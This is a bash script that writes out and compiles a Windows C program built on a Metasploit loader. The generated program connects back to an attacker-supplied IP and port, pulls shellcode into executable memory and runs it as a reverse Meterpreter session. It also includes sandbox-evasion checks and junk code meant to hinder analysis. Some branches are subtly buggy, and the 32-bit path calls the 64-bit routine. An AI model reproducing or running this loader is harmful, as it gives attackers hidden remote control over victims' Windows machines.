#!/bin/bash
clear
echo "****************************************************************"
echo " Automatic C source code generator - FOR METASPLOIT "
echo " Based on rsmudge metasploit-loader "
echo " Stolen from Astr0baby "
echo "****************************************************************" 
echo -en 'Metasploit server IP : ' 
read ip
echo -en 'Metasploit port number : ' 
read port 
echo '#include <stdio.h>' > temp.c 
echo '#include <stdlib.h>' >> temp.c 
echo '#include <winsock2.h>' >> temp.c 
echo '#include <windows.h>' >> temp.c 
echo 'void winsock_init();' >> temp.c 
echo 'void Kick(SOCKET my_socket, char * error);' >> temp.c
echo 'void genlol();' >> temp.c
echo 'int recv_all(SOCKET my_socket, void * buffer, int len);' >> temp.c
echo 'SOCKET wsconnect(char * targetip, int port);' >> temp.c
echo 'int random_in_range (unsigned int min, unsigned int max);' >> temp.c
echo 'char* rev(char* str);' >> temp.c
echo 'int sandbox_evasion();' >> temp.c
echo 'inline void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort);' >> temp.c
echo 'void winsock_init() {' >> temp.c
echo ' WSADATA wsaData;' >> temp.c
echo ' WORD wVersionRequested;' >> temp.c
echo ' wVersionRequested = MAKEWORD(2, 2);' >> temp.c
echo ' if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> temp.c
echo ' printf("ws2_32.dll is out of date.\n");' >> temp.c
echo ' WSACleanup();' >> temp.c
echo ' exit(1);' >> temp.c
echo ' }' >> temp.c
echo '}' >> temp.c
echo 'void Kick(SOCKET my_socket, char * error) {' >> temp.c
echo ' printf("error: %s\n", error);' >> temp.c
echo ' closesocket(my_socket);' >> temp.c
echo ' WSACleanup();' >> temp.c
echo ' exit(1);' >> temp.c
echo ' }' >> temp.c 
echo 'void genlol(){' >> temp.c
echo ' int num1, num2, num3;' >> temp.c
echo ' num1=100;' >> temp.c
echo ' while (num1<=5) {' >> temp.c
echo ' num1=random_in_range(0,10000);' >> temp.c
echo ' num2=random_in_range(0,10000);' >> temp.c
echo ' num3=random_in_range(0,10000);' >> temp.c
echo ' }' >> temp.c
echo '}' >> temp.c
echo 'int recv_all(SOCKET my_socket, void * buffer, int len) {' >> temp.c
echo ' int tret = 0;' >> temp.c
echo ' int nret = 0;' >> temp.c
echo ' void * startb = buffer;' >> temp.c
echo ' while (tret < len) {' >> temp.c
echo ' nret = recv(my_socket, (char *)startb, len - tret, 0);' >> temp.c
echo ' startb += nret;' >> temp.c
echo ' tret += nret;' >> temp.c
echo ' if (nret == SOCKET_ERROR)' >> temp.c
echo ' Kick(my_socket, "Could not receive data");' >> temp.c
echo ' }' >> temp.c
echo ' return tret;' >> temp.c
echo '}' >> temp.c
echo 'SOCKET wsconnect(char * targetip, int port) {' >> temp.c
echo ' struct hostent * target;' >> temp.c
echo ' struct sockaddr_in sock;' >> temp.c
echo ' SOCKET my_socket;' >> temp.c
echo ' my_socket = socket(AF_INET, SOCK_STREAM, 0);' >> temp.c
echo ' if (my_socket == INVALID_SOCKET)' >> temp.c
echo ' Kick(my_socket, "Cannot initialize socket");' >> temp.c
echo ' target = gethostbyname(targetip);' >> temp.c
echo ' if (target == NULL)' >> temp.c
echo ' Kick(my_socket, "cannot resolve target");' >> temp.c
echo ' memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);' >> temp.c
echo ' sock.sin_family = AF_INET;' >> temp.c
echo ' sock.sin_port = htons(port);' >> temp.c
echo ' if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )' >> temp.c
echo ' Kick(my_socket, "Could not connect");' >> temp.c
echo ' return my_socket;' >> temp.c
echo '}' >> temp.c
echo 'int random_in_range (unsigned int min, unsigned int max)' >> temp.c
echo '{' >> temp.c
echo ' int base_random = rand(); ' >> temp.c
echo ' if (RAND_MAX == base_random){' >> temp.c
echo ' return random_in_range(min, max);' >> temp.c
echo ' }' >> temp.c
echo ' int range = max - min,' >> temp.c
echo ' remainder = RAND_MAX % range,' >> temp.c
echo ' bucket = RAND_MAX / range;' >> temp.c
echo ' if (base_random < RAND_MAX - remainder) {' >> temp.c
echo ' return min + base_random/bucket;' >> temp.c
echo ' } else {' >> temp.c
echo ' return random_in_range (min, max);' >> temp.c
echo ' }' >> temp.c
echo '}' >> temp.c
echo 'char* rev(char* str)' >> temp.c
echo '{' >> temp.c
echo ' int end=strlen(str)-1;' >> temp.c
echo ' int i;' >> temp.c
echo ' for(i=5; i<end; i++)' >> temp.c
echo ' {' >> temp.c
echo ' str[i] ^= 1;' >> temp.c
echo ' }' >> temp.c
echo ' return str;' >> temp.c
echo '}' >> temp.c
echo 'int sandbox_evasion(){' >> temp.c
echo ' MSG msg;' >> temp.c
echo ' DWORD tc;' >> temp.c
echo ' PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);' >> temp.c
echo ' if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))' >> temp.c
echo ' return -1;' >> temp.c
echo ' if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)' >> temp.c
echo ' return -1;' >> temp.c
echo ' tc = GetTickCount();' >> temp.c
echo ' Sleep(650);' >> temp.c
echo ' if (((GetTickCount() - tc) / 300) != 2)' >> temp.c
echo ' return -1;' >> temp.c
echo ' return 0;' >> temp.c
echo '}' >> temp.c
echo 'void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort){' >> temp.c
echo ' ULONG32 size;' >> temp.c
echo ' char * buffer;' >> temp.c
echo ' void (*function)();' >> temp.c
echo ' winsock_init();' >> temp.c
echo ' SOCKET my_socket = wsconnect(listenerIP, listenerPort);' >> temp.c
echo ' int count = recv(my_socket, (char *)&size, 4, 0);' >> temp.c
echo ' if (count != 4 || size <= 0)' >> temp.c
echo ' Kick(my_socket, "bad length value\n");' >> temp.c
echo ' genlol();' >> temp.c
echo ' buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);' >> temp.c
echo ' genlol();' >> temp.c 
echo ' if (buffer == NULL)' >> temp.c
echo ' Kick(my_socket, "bad buffer\n");' >> temp.c
echo ' buffer[0] = 0xBF;' >> temp.c
echo ' genlol();' >> temp.c
echo ' memcpy(buffer + 1, &my_socket, 4);' >> temp.c
echo ' genlol();' >> temp.c
echo ' count = recv_all(my_socket, buffer + 5, size);' >> temp.c
echo ' function = (void (*)())buffer;' >> temp.c
echo ' function();' >> temp.c
echo '}' >> temp.c
echo 'void reverse_tcp_meterpreter_x64(char * listenerIP,unsigned int listenerPort){' >> temp.c
echo ' ULONG32 size;' >> temp.c
echo ' char * buffer;' >> temp.c
echo ' void (*function)();' >> temp.c
echo ' winsock_init();' >> temp.c
echo ' SOCKET my_socket = wsconnect(listenerIP, listenerPort);' >> temp.c
echo ' int count = recv(my_socket, (char *)&size, 4, 0);' >> temp.c
echo ' if (count != 4 || size <= 0)' >> temp.c
echo ' Kick(my_socket, "bad length value\n");' >> temp.c
echo ' genlol();' >> temp.c
echo ' buffer = VirtualAlloc(0, size + 10, MEM_COMMIT, PAGE_EXECUTE_READWRITE);' >> temp.c
echo ' genlol();' >> temp.c
echo ' if (buffer == NULL)' >> temp.c
echo ' Kick(my_socket, "bad buffer\n");' >> temp.c
echo ' buffer[0] = 0x48;' >> temp.c
echo ' buffer[1] = 0xBF;' >> temp.c
echo ' genlol();' >> temp.c
echo ' memcpy(buffer + 2, &my_socket, 8);' >> temp.c
echo ' genlol();' >> temp.c
echo ' count = recv_all(my_socket, buffer + 10, size);' >> temp.c
echo ' function = (void (*)())buffer;' >> temp.c
echo ' function();' >> temp.c
echo '}' >> temp.c
echo 'int main(int argc, char *argv[]) {' >> temp.c
echo -n 'char * defaultListenerIP = "' >> temp.c 
echo -n $ip >> temp.c 
echo -n '";' >> temp.c
echo '' >> temp.c
echo -n 'unsigned int defaultListenerPort = ' >> temp.c 
echo -n $port >> temp.c 
echo -n ';' >> temp.c 
echo '' >> temp.c
echo ' sandbox_evasion();' >> temp.c
echo ' if(argc == 3){' >> temp.c
echo ' #ifdef ISX64' >> temp.c
echo ' reverse_tcp_meterpreter_x64(argv[1], atoi(argv[2]));' >> temp.c
echo ' #else' >> temp.c
echo ' reverse_tcp_meterpreter_x64(argv[1], atoi(argv[2]));' >> temp.c
echo ' #endif' >> temp.c
echo ' }else{' >> temp.c
echo ' #ifdef ISX64' >> temp.c
echo ' reverse_tcp_meterpreter_x64(defaultListenerIP, defaultListenerPort);' >> temp.c
echo ' #else' >> temp.c
echo ' reverse_tcp_meterpreter_x64(defaultListenerIP, defaultListenerPort);' >> temp.c
echo ' #endif' >> temp.c
echo ' }' >> temp.c
echo ' return 0;' >> temp.c
echo '}' >> temp.c
echo '(+) Compiling binary ..' 
i686-w64-mingw32-gcc temp.c -o file.exe -lws2_32 -mwindows 
file=`ls -la file.exe` ; echo '(+)' $file